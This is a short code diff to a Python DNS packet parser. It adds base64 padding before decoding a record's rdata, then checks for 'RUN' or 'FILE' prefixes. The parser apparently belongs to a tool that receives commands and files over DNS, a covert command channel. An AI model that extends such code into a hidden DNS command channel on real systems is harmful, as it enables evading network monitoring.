@@ -35,7 +35,8 @@ def parse_packet(packet):
         global cond
         cond = 1
         base64_rdata = packet[1][DNSRR].rdata[0]
-        rdata = base64.b64decode(base64_rdata)
+        base64_rdata_padded = add_padding(base64_rdata)
+        rdata = base64.b64decode(base64_rdata_padded)
         prefix_packet = rdata[:6]
         data_recieved = rdata[6:]
         if prefix_packet == RUN or prefix_packet == FILE:
